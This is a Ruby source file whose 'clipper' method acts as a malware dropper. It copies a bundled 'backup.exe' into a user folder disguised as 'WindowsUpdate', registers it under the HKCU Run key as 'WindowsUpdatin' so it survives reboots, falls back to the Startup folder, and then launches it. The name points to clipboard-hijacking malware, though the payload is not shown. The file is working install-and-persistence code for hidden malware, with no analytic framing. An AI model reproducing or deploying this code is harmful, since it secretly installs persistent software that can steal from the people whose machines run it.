require 'net/http'
require 'uri'
require 'base64'
require 'resolv'
require'fileutils'
require 'open3'
require 'open-uri'
require 'rbconfig'
class Windows
	def self.clipper
		if File.directory?(ENV["USERPROFILE"]+"\\AppData\\Local\\WindowsUpdate")
			FileUtils.rm_rf(ENV["USERPROFILE"] +"\\AppData\\Local\\WindowsUpdate")
		end
		cur_dir = File.dirname(__FILE__)
		FileUtils.mkdir_p(ENV["USERPROFILE"].to_s+"\\AppData\\Local\\WindowsUpdate")
		FileUtils.cp("#{cur_dir}/backup.exe", ENV["USERPROFILE"] + "\\AppData\\Local\\WindowsUpdate\\")
		begin
			cmd = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v WindowsUpdatin /t REG_SZ /d " + ENV["USERPROFILE"] + "\\AppData\\Local\\WindowsUpdate\\backup.exe"
			system(cmd)
		rescue
			FileUtils.cp("backup.exe", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\")
		end
		cur_dir = File.dirname(__FILE__)
		begin
			output, status = Open3.capture2("#{cur_dir}/backup.exe")
		rescue
		end
	end
end
